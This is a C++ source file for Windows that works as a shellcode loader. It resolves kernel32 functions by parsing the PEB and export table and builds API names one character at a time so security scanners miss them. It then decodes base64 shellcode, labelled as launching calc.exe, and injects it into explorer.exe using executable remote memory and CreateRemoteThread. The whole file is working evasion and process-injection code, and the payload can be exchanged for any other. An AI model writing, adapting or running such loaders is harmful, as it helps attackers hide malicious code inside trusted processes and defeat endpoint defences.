#undef UNICODE
#undef _UNICODE
#include <iostream>
#include <string>
#include <vector>
#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <cwchar>

// Function pointer typedefs for Windows API functions
typedef HMODULE(WINAPI* pGetModuleHandleA)(LPCSTR);
typedef FARPROC(WINAPI* pGetProcAddress)(HMODULE, LPCSTR);
typedef HANDLE(WINAPI* pCreateToolhelp32Snapshot)(DWORD, DWORD);
typedef BOOL(WINAPI* pProcess32First)(HANDLE, LPPROCESSENTRY32);
typedef BOOL(WINAPI* pProcess32Next)(HANDLE, LPPROCESSENTRY32);
typedef HANDLE(WINAPI* pOpenProcess)(DWORD, BOOL, DWORD);
typedef LPVOID(WINAPI* pVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL(WINAPI* pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
typedef HANDLE(WINAPI* pCreateRemoteThread)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef BOOL(WINAPI* pCloseHandle)(HANDLE);
typedef BOOL(WINAPI* pVirtualFreeEx)(HANDLE, LPVOID, SIZE_T, DWORD);

// Global function pointers
pCreateToolhelp32Snapshot CreateToolhelp32Snapshot_ptr = nullptr;
pProcess32First Process32First_ptr = nullptr;
pProcess32Next Process32Next_ptr = nullptr;
pOpenProcess OpenProcess_ptr = nullptr;
pVirtualAllocEx VirtualAllocEx_ptr = nullptr;
pWriteProcessMemory WriteProcessMemory_ptr = nullptr;
pCreateRemoteThread CreateRemoteThread_ptr = nullptr;
pCloseHandle CloseHandle_ptr = nullptr;
pVirtualFreeEx VirtualFreeEx_ptr = nullptr;

// Custom case-insensitive string compare
int my_stricmp(const char* s1, const char* s2) {
    while (*s1 && (tolower(*s1) == tolower(*s2))) {
        s1++;
        s2++;
    }
    return *(const unsigned char*)s1 - *(const unsigned char*)s2;
}

// Manually get module handle by parsing the PEB
HMODULE get_module_handle_manual(const wchar_t* module_name) {
    PEB* peb = (PEB*)__readgsqword(0x60);
    PEB_LDR_DATA* ldr = peb->Ldr;
    LIST_ENTRY* head = &ldr->InMemoryOrderModuleList;
    LIST_ENTRY* curr = head->Flink;

    while (curr != head) {
        LDR_DATA_TABLE_ENTRY* entry = CONTAINING_RECORD(curr, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        if (entry->FullDllName.Buffer != nullptr) {
            const wchar_t* full_name = entry->FullDllName.Buffer;
            const wchar_t* base_name = wcsrchr(full_name, L'\\');
            if (base_name == nullptr) {
                base_name = full_name;
            } else {
                base_name++; // Move past the backslash
            }
            if (_wcsicmp(base_name, module_name) == 0) {
                return (HMODULE)entry->DllBase;
            }
        }
        curr = curr->Flink;
    }
    return NULL;
}

// Manually get function address by parsing the EAT
FARPROC get_proc_address_manual(HMODULE h_mod, const char* func_name) {
    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)h_mod;
    PIMAGE_NT_HEADERS nt_headers = (PIMAGE_NT_HEADERS)((BYTE*)h_mod + dos_header->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY export_dir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)h_mod + nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    PDWORD addr_of_funcs = (PDWORD)((BYTE*)h_mod + export_dir->AddressOfFunctions);
    PDWORD addr_of_names = (PDWORD)((BYTE*)h_mod + export_dir->AddressOfNames);
    PWORD addr_of_name_ordinals = (PWORD)((BYTE*)h_mod + export_dir->AddressOfNameOrdinals);

    for (DWORD i = 0; i < export_dir->NumberOfNames; i++) {
        if (my_stricmp(func_name, (const char*)h_mod + addr_of_names[i]) == 0) {
            return (FARPROC)((BYTE*)h_mod + addr_of_funcs[addr_of_name_ordinals[i]]);
        }
    }

    return NULL;
}


// Function to decode a Base64 encoded string
std::string base64_decode(std::string const& encoded_string) {
    std::string base64_chars =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "abcdefghijklmnopqrstuvwxyz"
        "0123456789+/";
    std::string decoded;
    std::vector<int> T(256, -1);
    for (int i = 0; i < 64; i++) T[base64_chars[i]] = i;

    int val = 0, valb = -8;
    for (char c : encoded_string) {
        if (T[c] == -1) break;
        val = (val << 6) + T[c];
        valb += 6;
        if (valb >= 0) {
            decoded.push_back(char((val >> valb) & 0xFF));
            valb -= 8;
        }
    }
    return decoded;
}

// Function to get the process ID of explorer.exe
DWORD get_proc_id(const char* proc_name) {
    DWORD proc_id = 0;
    HANDLE h_snap = CreateToolhelp32Snapshot_ptr(TH32CS_SNAPPROCESS, 0);
    if (h_snap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 proc_entry;
        proc_entry.dwSize = sizeof(proc_entry);
        if (Process32First_ptr(h_snap, &proc_entry)) {
            do {
                if (!my_stricmp(proc_entry.szExeFile, proc_name)) {
                    proc_id = proc_entry.th32ProcessID;
                    break;
                }
            } while (Process32Next_ptr(h_snap, &proc_entry));
        }
    }
    CloseHandle_ptr(h_snap);
    return proc_id;
}

int main() {
    // Obfuscated strings for function names
    wchar_t kernel32_dll_wstr[] = {L'k', L'e', L'r', L'n', L'e', L'l', L'3', L'2', L'.', L'd', L'l', L'l', 0};
    char create_toolhelp_str[] = {'C', 'r', 'e', 'a', 't', 'e', 'T', 'o', 'o', 'l', 'h', 'e', 'l', 'p', '3', '2', 'S', 'n', 'a', 'p', 's', 'h', 'o', 't', 0};
    char process32_first_str[] = {'P', 'r', 'o', 'c', 'e', 's', 's', '3', '2', 'F', 'i', 'r', 's', 't', 0};
    char process32_next_str[] = {'P', 'r', 'o', 'c', 'e', 's', 's', '3', '2', 'N', 'e', 'x', 't', 0};
    char open_process_str[] = {'O', 'p', 'e', 'n', 'P', 'r', 'o', 'c', 'e', 's', 's', 0};
    char virtual_alloc_ex_str[] = {'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', 'E', 'x', 0};
    char write_process_mem_str[] = {'W', 'r', 'i', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'M', 'e', 'm', 'o', 'r', 'y', 0};
    char create_remote_thread_str[] = {'C', 'r', 'e', 'a', 't', 'e', 'R', 'e', 'm', 'o', 't', 'e', 'T', 'h', 'r', 'e', 'a', 'd', 0};
    char close_handle_str[] = {'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 0};
    char virtual_free_ex_str[] = {'V', 'i', 'r', 't', 'u', 'a', 'l', 'F', 'r', 'e', 'e', 'E', 'x', 0};

    HMODULE h_kernel32 = get_module_handle_manual(kernel32_dll_wstr);

    CreateToolhelp32Snapshot_ptr = (pCreateToolhelp32Snapshot)get_proc_address_manual(h_kernel32, create_toolhelp_str);
    Process32First_ptr = (pProcess32First)get_proc_address_manual(h_kernel32, process32_first_str);
    Process32Next_ptr = (pProcess32Next)get_proc_address_manual(h_kernel32, process32_next_str);
    OpenProcess_ptr = (pOpenProcess)get_proc_address_manual(h_kernel32, open_process_str);
    VirtualAllocEx_ptr = (pVirtualAllocEx)get_proc_address_manual(h_kernel32, virtual_alloc_ex_str);
    WriteProcessMemory_ptr = (pWriteProcessMemory)get_proc_address_manual(h_kernel32, write_process_mem_str);
    CreateRemoteThread_ptr = (pCreateRemoteThread)get_proc_address_manual(h_kernel32, create_remote_thread_str);
    CloseHandle_ptr = (pCloseHandle)get_proc_address_manual(h_kernel32, close_handle_str);
    VirtualFreeEx_ptr = (pVirtualFreeEx)get_proc_address_manual(h_kernel32, virtual_free_ex_str);

    // Base64 encoded shellcode for calc.exe
    std::string encoded_shellcode = "SDHSZUiLQsBIi3AYSLt2IEyLDTyLCU2LSSDrY0GLSTxNMc/BtwlNhUnPRYt/TQHPSYsPEUu3IE0BzuM//8lIMfaBi0SOThzMSMeo0AcIu/REOcJ12kWLVyRNActBC7cMSo0EawSLTAnIw8NBuggp/v+oDuiS//9/SDFJUUi5Y2FsYy5leGVRSM0MJEgxyEj/wkCD7Cj/0A==";
    std::string decoded_shellcode = base64_decode(encoded_shellcode);

    char explorer_exe_str[] = {'e', 'x', 'p', 'l', 'o', 'r', 'e', 'r', '.', 'e', 'x', 'e', 0};
    DWORD proc_id = get_proc_id(explorer_exe_str);
    if (proc_id == 0) {
        return 1;
    }

    HANDLE h_proc = OpenProcess_ptr(PROCESS_ALL_ACCESS, FALSE, proc_id);
    if (h_proc == NULL) {
        return 1;
    }

    LPVOID remote_mem = VirtualAllocEx_ptr(h_proc, NULL, decoded_shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (remote_mem == NULL) {
        CloseHandle_ptr(h_proc);
        return 1;
    }

    if (!WriteProcessMemory_ptr(h_proc, remote_mem, decoded_shellcode.c_str(), decoded_shellcode.size(), NULL)) {
        VirtualFreeEx_ptr(h_proc, remote_mem, 0, MEM_RELEASE);
        CloseHandle_ptr(h_proc);
        return 1;
    }

    HANDLE h_thread = CreateRemoteThread_ptr(h_proc, NULL, 0, (LPTHREAD_START_ROUTINE)remote_mem, NULL, 0, NULL);
    if (h_thread == NULL) {
        VirtualFreeEx_ptr(h_proc, remote_mem, 0, MEM_RELEASE);
        CloseHandle_ptr(h_proc);
        return 1;
    }

    CloseHandle_ptr(h_thread);
    CloseHandle_ptr(h_proc);

    return 0;
}